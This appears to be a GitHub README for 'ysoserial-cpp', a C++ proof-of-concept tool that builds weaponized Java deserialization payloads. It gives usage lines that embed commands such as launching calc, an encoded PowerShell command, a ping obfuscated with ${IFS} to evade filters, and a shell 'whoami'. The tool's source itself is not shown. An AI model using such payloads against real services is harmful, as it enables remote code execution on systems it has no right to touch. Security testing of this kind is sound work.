# ysoserial-cpp


```
      .                                                                    
  .x88888x.          JennyLab Research!                            ..         
 :8**888888X.  :>               u.    u.      u.    u.    @L                  
 f    `888888x./       .u     x@88k u@88c.  x@88k u@88c. 9888i   .dL    
'       `*88888~    ud8888.  ^"8888""8888" ^"8888""8888" `Y888k:*888.  
 \.    .  `?)X.   :888'8888.   8888  888R    8888  888R    888E  888I  
  `~=-^   X88> ~  d888 '88%"   8888  888R    8888  888R    888E  888I   
         X8888  ~ 8888.+"      8888  888R    8888  888R    888E  888I    
         488888   8888L        8888  888R    8888  888R    888E  888I 
 .xx.     88888X  '8888c. .+  "*88*" 8888"  "*88*" 8888"  x888N><888'  
'*8888.   '88888>  "88888%      ""   'Y"      ""   'Y"     "88"  888       
  88888    '8888>    "YP'                                        88F             
  `8888>    `888            @h0ffy                               98"                                          
   "8888     8%                2025                             ./"                                            
    `"888x:-"                                                ~`                                            

```

![image](https://github.com/user-attachments/assets/da6827fc-b24f-4b6d-8faa-fc99d5a233e5)




## ysoserial-cpp ( PoC )
Implementation of object serializations an weaponizing in cpp similar functionalitity ( a lost day... than yoserial )

GNU GPL3 License ( JennyLab OpenSource )
    

### Build

```
g++ -std=c++17 -O2 -o ysoserial-cpp ysoserial.cpp
```


### Payload inject execution commands abusing serialization

```
./ysoserial-cpp templates "cmd /c calc"
```

### Encoding

```
./ysoserial-cpp object1 "powershell -enc <base64_command>"
```
        
### Obfucation 

```
./ysoserial-cpp object2 "p\${IFS}ing\${IFS}8.8.8.8"
```
        
### Inyecting ENV

```
./ysoserial-cpp templates "\$SHELL -c 'whoami'"
```




## Code "ysoserial-cpp.cpp"
```
  ysoserial.cpp   # ysoserial-cpp
  ├── JavaSerialization   # Constants and types
  ├── JavaPayloadGen # Main class to make and object in C++ to serialize this serialization with provide and destination in seralize... Seria... Lize!!!
```                                                           
